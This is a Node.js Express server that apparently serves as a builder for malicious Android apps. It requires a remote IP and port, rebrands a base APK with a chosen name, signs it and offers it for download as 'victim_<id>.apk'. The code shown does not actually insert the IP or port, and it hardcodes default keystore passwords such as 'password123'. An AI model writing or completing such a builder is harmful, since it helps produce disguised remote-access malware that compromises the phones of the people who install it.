import express from "express";
import cors from "cors";
import multer from "multer";
import fs from "fs";
import path from "path";
import AdmZip from "adm-zip";
import { exec } from "child_process";
import { fileURLToPath } from 'url';
import { dirname } from 'path';

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

const baseApkFile = path.resolve(__dirname, "base.apk");
const resultApkFolder = path.resolve(__dirname, "output_apks");
const uploadTmpFolder = path.resolve(__dirname, "uploads");
const keyStoreFile = path.resolve(__dirname, "keystore.jks");

const keyStorePass = process.env.KEYSTORE_PASSWORD || "password123";
const keyAliasPass = process.env.KEY_ALIAS || "mykey";
const keyPass = process.env.KEY_PASSWORD || "password123";

const app = express();

app.use(cors());
app.use(express.json({ limit: "100mb" }));

const upload = multer();

if (!fs.existsSync(resultApkFolder)) fs.mkdirSync(resultApkFolder, { recursive: true });
if (!fs.existsSync(uploadTmpFolder)) fs.mkdirSync(uploadTmpFolder, { recursive: true });

app.get("/", (req, res) => {
  res.json({ status: "APK Builder Live", baseApkExists: fs.existsSync(baseApkFile) });
});

app.post("/build-apk", upload.single("iconFile"), async (req, res) => {
  try {
    const { applicationName, remoteIP, remotePort, backendServiceUrl, packageName } = req.body;
    if (!applicationName || !remoteIP || !remotePort) return res.status(400).json({ error: "Missing fields" });

    const uniqueBuild = Date.now() + "_" + Math.floor(Math.random() * 10000);
    const tempExtractionFolder = path.join(resultApkFolder, `temp_${uniqueBuild}`);
    const unsignedApkFile = path.join(resultApkFolder, `unsigned_${uniqueBuild}.apk`);
    const signedApkFile = path.join(resultApkFolder, `victim_${uniqueBuild}.apk`);

    const zip = new AdmZip(baseApkFile);
    zip.extractAllTo(tempExtractionFolder, true);

    const stringsXmlPath = path.join(tempExtractionFolder, "res", "values", "strings.xml");
    if (fs.existsSync(stringsXmlPath)) {
      let xmlContent = fs.readFileSync(stringsXmlPath, "utf8");
      xmlContent = xmlContent.replace(/<string name="app_name">[^<]*<\/string>/,
        `<string name="app_name">${applicationName}</string>`);
      fs.writeFileSync(stringsXmlPath, xmlContent, "utf8");
    }

    const zipNew = new AdmZip();
    (function addToZip(zipper, folder, base = "") {
      fs.readdirSync(folder).forEach(item => {
        const fullItemPath = path.join(folder, item);
        const relativePath = base ? `${base}/${item}` : item;
        if (fs.lstatSync(fullItemPath).isDirectory()) addToZip(zipper, fullItemPath, relativePath);
        else zipper.addLocalFile(fullItemPath, base);
      });
    })(zipNew, tempExtractionFolder);

    zipNew.writeZip(unsignedApkFile);

    let outputApkPath = unsignedApkFile;
    if (fs.existsSync(keyStoreFile)) {
      await sign_apk(unsignedApkFile, signedApkFile);
      outputApkPath = signedApkFile;
    }

    fs.rmSync(tempExtractionFolder, { recursive: true, force: true });

    res.json({ success: true, downloadUrl: `/download/${uniqueBuild}`, signed: fs.existsSync(keyStoreFile), message: "APK built and ready" });

  } catch (error) {
    console.error(error);
    res.status(500).json({ error: error.message });
  }
});

app.get("/download/:buildId", (req, res) => {
  const { buildId } = req.params;
  const signedApk = path.join(resultApkFolder, `victim_${buildId}.apk`);
  const unsignedApk = path.join(resultApkFolder, `unsigned_${buildId}.apk`);
  const apkToSend = fs.existsSync(signedApk) ? signedApk : unsignedApk;

  if (!fs.existsSync(apkToSend)) return res.status(404).json({ error: "APK not found" });

  res.download(apkToSend, err => {
    if (!err) fs.unlink(apkToSend, unlinkErr => { if (unlinkErr) console.error("Error deleting APK:", unlinkErr); });
  });
});

function sign_apk(input, output) {
  return new Promise((resolve, reject) => {
    const command = `jarsigner -verbose -keystore "${keyStoreFile}" -storepass "${keyStorePass}" -keypass "${keyPass}" -signedjar "${output}" "${input}" "${keyAliasPass}"`;
    exec(command, (err, stdout, stderr) => {
      if (err) return reject(new Error(stderr));
      resolve(stdout);
    });
  });
}

const port = process.env.PORT || 1808;
app.listen(port, () => { console.log(`Server running on port ${port}`); });

export default app;
